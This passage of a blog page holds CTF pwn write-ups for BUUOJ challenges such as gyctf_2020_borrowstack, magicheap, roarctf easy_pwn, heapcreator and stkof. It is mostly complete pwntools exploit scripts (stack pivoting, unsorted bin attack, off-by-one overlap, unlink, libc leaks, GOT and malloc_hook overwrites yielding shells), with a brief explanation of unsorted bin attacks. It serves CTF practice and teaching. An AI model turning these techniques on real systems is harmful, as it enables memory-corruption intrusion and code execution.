class="number">0x80</span>,<span class="string">&quot;nam1&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam2&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam3&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)  <span class="comment">#写入/bin/sh</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;nam1&#x27;</span>,<span class="number">0x100</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+p32(free_got)</span><br><span class="line">update(<span class="number">3</span>,<span class="number">0x200</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">0x80</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="gyctf_2020_borrowstack栈迁移"><a class="markdownIt-Anchor" href="#gyctf_2020_borrowstack栈迁移">#</a> gyctf_2020_borrowstack (栈迁移)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29385</span>)</span><br><span class="line"></span><br><span class="line">bank=<span class="number">0x0601080</span></span><br><span class="line">leave=<span class="number">0x400699</span></span><br><span class="line">puts_plt=<span class="number">0x04004E0</span></span><br><span class="line">puts_got=<span class="number">0x0601018</span></span><br><span class="line">pop_rdi=<span class="number">0x400703</span></span><br><span class="line">main=<span class="number">0x0400626</span></span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;u want&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bank)+p64(leave)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;now!&#x27;</span>)</span><br><span class="line">payload=p64(ret)*<span class="number">20</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(one_gadget)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="hitcontraining_magicheapunsorted-bin-attack"><a class="markdownIt-Anchor" href="#hitcontraining_magicheapunsorted-bin-attack">#</a> hitcontraining_magicheap（unsorted bin attack)</h1><blockquote><p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。<br>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。<br>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。<br>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202072330538.png" alt="在这里插入图片描述"></p><p>初始状态时 unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。<br>执行 free 由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。<br>修改 p [1] 经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。<br>所以核心在于通过修改使堆块的 fd 指针指向利用的地址 - 16</p></blockquote><h2 id="exp-8"><a class="markdownIt-Anchor" href="#exp-8">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./magicheap&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26349</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateHeap</span>(<span class="params">size,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EditHeap</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeleteHeap</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">CreateHeap(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">CreateHeap(<span class="number">0x80</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">CreateHeap(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">DeleteHeap(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020A0</span></span><br><span class="line">EditHeap(<span class="number">0</span>,<span class="number">0x50</span>,<span class="number">0x30</span> * <span class="string">&quot;a&quot;</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>))<span class="comment"># 修改heap1的fd和bk指针</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">CreateHeap(<span class="number">0x80</span>,<span class="string">&#x27;dddd&#x27;</span>) <span class="comment">#触发</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4869&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="roarctf_2019_easy_pwnoff-by-one"><a class="markdownIt-Anchor" href="#roarctf_2019_easy_pwnoff-by-one">#</a> roarctf_2019_easy_pwn（off-by-one)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26307</span>)</span><br><span class="line"><span class="comment"># r=process(&#x27;roarctf_2019_easy_pwn&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,data</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line">malloc_hook=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook=libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(realloc_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&quot;b calloc&quot;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x90</span>)<span class="comment">#idx2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#idx3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">34</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x20</span>)+p8(<span class="number">0xa1</span>))<span class="comment">#off by one </span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x21</span>))<span class="comment">#by pass check </span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>)<span class="comment">#idx1 chunk overlap</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">0x20</span>)</span><br><span class="line">libc_base=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook+libc_base-<span class="number">0x23</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#idx4</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">one_gadgets=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf1147</span>,<span class="number">0xf02a4</span>]</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">27</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>+p64(libc_base+one_gadgets[<span class="number">2</span>])+p64(libc_base+realloc_hook+<span class="number">4</span>)) </span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="hitcontraining_heapcreatoroff-by-one"><a class="markdownIt-Anchor" href="#hitcontraining_heapcreatoroff-by-one">#</a> hitcontraining_heapcreator(off-by-one)</h1><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202081012691.png" alt="image-20220208101203616"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25982</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./heapcreator&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">length,value</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(length)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    sh.sendline(value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,value</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    sh.sendline(value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">size = <span class="string">&#x27;\x08&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr = u64(sh.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr)</span><br><span class="line">system_addr=free_addr+libc.dump(<span class="string">&quot;system&quot;</span>)-libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_45677731/article/details/107914807">https://blog.csdn.net/weixin_45677731/article/details/107914807</a></p><h1 id="hitcon2014_stkofunlink"><a class="markdownIt-Anchor" href="#hitcon2014_stkofunlink">#</a> hitcon2014_stkof(unlink)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># sh=remote(&quot;node4.buuoj.cn&quot;,28995)</span></span><br><span class="line">sh=process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">ptr=<span class="number">0x602150</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free)+p64(ptr-<span class="number">0x18</span>)+p64(puts_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span 